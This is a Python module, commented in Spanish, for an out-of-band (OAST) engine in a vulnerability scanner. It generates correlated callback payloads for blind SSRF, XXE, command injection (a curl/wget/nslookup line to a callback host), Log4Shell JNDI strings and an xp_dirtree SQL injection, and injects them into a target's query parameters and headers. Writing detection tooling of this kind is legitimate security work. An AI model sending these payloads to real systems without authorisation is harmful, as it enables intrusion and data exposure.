"""Motor de Detección Fuera de Banda (OAST - Out-of-Band AST) para VulnScanner.

Detecta vulnerabilidades ciegas de alto impacto (Blind SSRF, Blind XXE, Blind RCE, Log4j/JNDI)
mediante la correlación de interacciones DNS y HTTP asíncronas.
"""
import contextlib
import logging
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

from scanner.models import Evidence, Finding

_logger = logging.getLogger("VulnScanner.OAST")


class OASTHTTPHandler(BaseHTTPRequestHandler):
    """Manejador HTTP mínimo para registrar llamadas entrantes OAST locales."""

    def do_GET(self) -> None:
        self._record_and_respond()

    def do_POST(self) -> None:
        self._record_and_respond()

    def do_HEAD(self) -> None:
        self._record_and_respond()

    def _record_and_respond(self) -> None:
        # Drenar cuerpo de la petición si está presente para evitar reset de conexión TCP en Windows
        with contextlib.suppress(Exception):
            length = int(self.headers.get("Content-Length", 0))
            if length > 0:
                self.rfile.read(length)

        path = self.path
        client_ip = self.client_address[0] if self.client_address else "127.0.0.1"
        server_obj = getattr(self.server, "local_oast_server", None)
        if server_obj and hasattr(server_obj, "record_interaction"):
            server_obj.record_interaction(path=path, client_ip=client_ip, method=self.command)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("X-OAST-Engine", "OmniBreach-OAST")
        self.end_headers()
        self.wfile.write(b"<!-- OAST Correlated -->")

    def log_message(self, format: str, *args: Any) -> None:
        pass


class OASTLocalServer:
    """Servidor HTTP de escucha local multihilo para correlación OAST sin internet."""

    def __init__(self, host: str = "127.0.0.1", port: int = 0):
        self.host = host
        self.requested_port = port
        self.httpd: Optional[HTTPServer] = None
        self.thread: Optional[threading.Thread] = None
        self.port: int = 0
        self.interactions: list[dict[str, Any]] = []
        self._lock = threading.Lock()

    def start(self) -> int:
        """Inicia el servidor en un hilo secundario daemon y retorna el puerto asignado."""
        if self.httpd is not None:
            return self.port

        self.httpd = HTTPServer((self.host, self.requested_port), OASTHTTPHandler)
        self.httpd.local_oast_server = self  # type: ignore[attr-defined]
        self.port = int(self.httpd.server_address[1])

        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        _logger.info("Servidor OAST local iniciado en %s:%d", self.host, self.port)
        return self.port

    def record_interaction(self, path: str, client_ip: str, method: str) -> None:
        with self._lock:
            self.interactions.append({
                "type": "HTTP",
                "path": path,
                "client_ip": client_ip,
                "method": method,
                "timestamp": time.time(),
            })

    def get_interactions_for_token(self, token: str) -> list[dict[str, Any]]:
        with self._lock:
            return [
                item for item in self.interactions
                if token in str(item.get("path", ""))
            ]

    def stop(self) -> None:
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.httpd = None
            self.thread = None
            _logger.info("Servidor OAST local detenido.")


class OASTClient:
    """Cliente de correlación para pruebas Out-of-Band (OAST).

    Soporta servidores de interacción públicos/privados (estilo Interactsh/Burp Collaborator),
    un servidor local embebido (OASTLocalServer) y un modo simulado/mock para pruebas.
    """

    def __init__(
        self,
        server_domain: str = "oast.live",
        mock_mode: bool = False,
        local_server: Optional[OASTLocalServer] = None
    ):
        self.server_domain = server_domain
        self.mock_mode = mock_mode
        self.local_server = local_server
        self._registered_interactions: dict[str, list[dict[str, Any]]] = {}
        self._generated_tokens: set[str] = set()

    def generate_token(self, prefix: str = "vuln") -> str:
        """Genera un token de correlación único y registra la sesión."""
        unique_id = uuid.uuid4().hex[:12]
        token = f"{prefix}-{unique_id}"
        self._generated_tokens.add(token)
        self._registered_interactions[token] = []
        return token

    def get_callback_url(self, token: str) -> str:
        """Retorna una URL completa de callback vinculada al token."""
        if self.local_server and self.local_server.port > 0:
            return f"http://{self.local_server.host}:{self.local_server.port}/{token}"
        return f"http://{token}.{self.server_domain}"

    def get_callback_host(self, token: str) -> str:
        """Retorna el FQDN de callback para consultas DNS."""
        if self.local_server and self.local_server.port > 0:
            return f"{self.local_server.host}:{self.local_server.port}"
        return f"{token}.{self.server_domain}"

    def generate_payloads(self, token: str) -> dict[str, str]:
        """Genera payloads OAST especializados para múltiples categorías de ataque."""
        cb_url = self.get_callback_url(token)
        cb_host = self.get_callback_host(token)

        return {
            "ssrf": cb_url,
            "xxe": f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "{cb_url}/xxe.dtd">%ext;]><root>&ext;</root>',
            "xxe_param": f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "{cb_url}">%ext;]><root><test>1</test></root>',
            "rce": f'; curl {cb_url} || nslookup {cb_host} || wget {cb_url} &',
            "log4j": f'${{jndi:ldap://{cb_host}/a}}',
            "sqli_oob": f"'; exec master..xp_dirtree '//{cb_host}/oob'--",
            "redirect": cb_url,
        }

    def record_mock_interaction(self, token: str, interaction_type: str = "DNS", client_ip: str = "127.0.0.1") -> None:
        """Permite registrar interacciones en modo simulado para tests unitarios."""
        if token in self._registered_interactions:
            self._registered_interactions[token].append({
                "type": interaction_type,
                "client_ip": client_ip,
                "timestamp": time.time(),
            })

    def poll_interactions(self, token: str, timeout: float = 2.0) -> list[dict[str, Any]]:
        """Consulta si el token recibió interacciones remotas (DNS o HTTP)."""
        if self.local_server:
            local_hits = self.local_server.get_interactions_for_token(token)
            if local_hits:
                return local_hits

        if self.mock_mode:
            return self._registered_interactions.get(token, [])

        # Consulta al servidor de correlación OAST (ejemplo con API Interactsh)
        try:
            poll_url = f"https://api.{self.server_domain}/interactions/{token}"
            resp = requests.get(poll_url, timeout=timeout)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list):
                    return data
        except (requests.RequestException, ValueError):
            pass

        return self._registered_interactions.get(token, [])


# Instancia global por defecto
default_oast_client = OASTClient()


# Parámetros comúnmente vulnerables a SSRF / Deserialización / URL Fetchers
SSRF_TARGET_PARAMS = [
    "url", "dest", "destination", "redirect", "uri", "path", "feed", "link",
    "src", "source", "file", "document", "callback", "webhook", "api", "target", "proxy"
]

# Cabeceras propensas a SSRF o RCE ciego en proxies inversos y pasarelas
OAST_HEADER_NAMES = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "Referer",
    "X-Wap-Profile",
    "Client-IP",
    "Contact",
]


def check_oast_vulnerabilities(
    url: str,
    session: Optional[requests.Session] = None,
    oast_client: Optional[OASTClient] = None
) -> list[Finding]:
    """Ejecuta pruebas Out-of-Band (OAST) contra parámetros y cabeceras de la URL.

    Args:
        url: URL base a analizar.
        session: Sesión opcional de requests configurada.
        oast_client: Cliente OAST para registrar y consultar interacciones.

    Returns:
        Lista de Findings confirmados con severidad Crítica/Alta si se detecta interacción.
    """
    client = oast_client or default_oast_client
    http_client = session if session is not None else requests
    findings: list[Finding] = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    # ─────────────────────────────────────────────────────────────
    # 1. Blind SSRF en parámetros de consulta (Query Params)
    # ─────────────────────────────────────────────────────────────
    if params:
        for param_name in params:
            param_lower = param_name.lower()
            # Probar si el nombre del parámetro coincide o se sospecha consumo remoto
            if any(target in param_lower for target in SSRF_TARGET_PARAMS) or len(params) <= 4:
                token = client.generate_token(prefix=f"ssrf-{param_name}")
                payloads = client.generate_payloads(token)
                ssrf_payload = payloads["ssrf"]

                test_params = params.copy()
                test_params[param_name] = [ssrf_payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                try:
                    r = http_client.get(test_url, timeout=5)
                    # Comprobar interacciones remotas
                    interactions = client.poll_interactions(token)
                    if interactions:
                        int_type = interactions[0].get("type", "HTTP/DNS")
                        findings.append(Finding(
                            category="ssrf",
                            title=f"Blind SSRF Confirmado (OAST) en parámetro '{param_name}'",
                            severity="critical",
                            confidence="confirmed",
                            description=(
                                f"El servidor procesó el parámetro '{param_name}' y realizó una petición externa "
                                f"hacia el servidor de correlación OAST ({int_type}). Esto confirma vulnerabilidad "
                                f"de Server-Side Request Forgery con 100% de certeza."
                            ),
                            affected_url=url,
                            parameter=param_name,
                            evidence=Evidence(
                                request_method="GET",
                                request_url=test_url,
                                payload=ssrf_payload,
                                response_status=r.status_code,
                                response_fragment=f"Interacción OAST recibida: {int_type} desde {interactions[0].get('client_ip', 'remoto')}"
                            ),
                            remediation="Validar URLs remotas contra una lista blanca fija, bloquear rangos privados/localhost y restringir el tráfico de salida del servidor."
                        ))
                except Exception as e:
                    _logger.debug("Error probando OAST SSRF en %s: %s", param_name, e)

    # ─────────────────────────────────────────────────────────────
    # 2. Blind Out-of-band en Cabeceras HTTP (SSRF / Log4j)
    # ─────────────────────────────────────────────────────────────
    header_token = client.generate_token(prefix="hdr-ssrf")
    header_cb = client.get_callback_url(header_token)
    log4j_token = client.generate_token(prefix="log4j")
    log4j_payload = client.generate_payloads(log4j_token)["log4j"]

    test_headers = {}
    for h in OAST_HEADER_NAMES:
        test_headers[h] = header_cb
    test_headers["User-Agent"] = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {log4j_payload}"

    try:
        r = http_client.get(url, headers=test_headers, timeout=5)

        # Comprobar si hubo callback por cabeceras
        hdr_interactions = client.poll_interactions(header_token)
        if hdr_interactions:
            findings.append(Finding(
                category="oast",
                title="Blind SSRF / Inyección en Cabeceras HTTP Confirmada (OAST)",
                severity="critical",
                confidence="confirmed",
                description=(
                    "El servidor o un middleware proxy consumió las cabeceras HTTP inyectadas "
                    "y realizó una conexión saliente al servidor OAST."
                ),
                affected_url=url,
                evidence=Evidence(
                    request_method="GET",
                    request_url=url,
                    payload=header_cb,
                    response_status=r.status_code,
                    response_fragment=f"Interacciones detectadas: {len(hdr_interactions)}"
                ),
                remediation="Deshabilitar el reenvío de cabeceras de proxy no confiables y sanitizar encabezados."
            ))

        # Comprobar si hubo callback por Log4j/JNDI
        log4j_interactions = client.poll_interactions(log4j_token)
        if log4j_interactions:
            findings.append(Finding(
                category="injections",
                title="Vulnerabilidad Crítica de Ejecución Remota Log4Shell / JNDI (OAST)",
                severity="critical",
                confidence="confirmed",
                description=(
                    "El servidor es vulnerable a Log4Shell (CVE-2021-44228). Procesó la expresión JNDI "
                    "e intentó resolver una conexión LDAP externa."
                ),
                affected_url=url,
                evidence=Evidence(
                    request_method="GET",
                    request_url=url,
                    payload=log4j_payload,
                    response_status=r.status_code,
                    response_fragment="Consulta JNDI/LDAP recibida en el servidor OAST."
                ),
                remediation="Actualizar inmediatamente Log4j a la versión 2.17.1 o superior y deshabilitar lookups JNDI (log4j2.formatMsgNoLookups=true)."
            ))

    except Exception as e:
        _logger.debug("Error probando OAST en cabeceras: %s", e)

    return findings
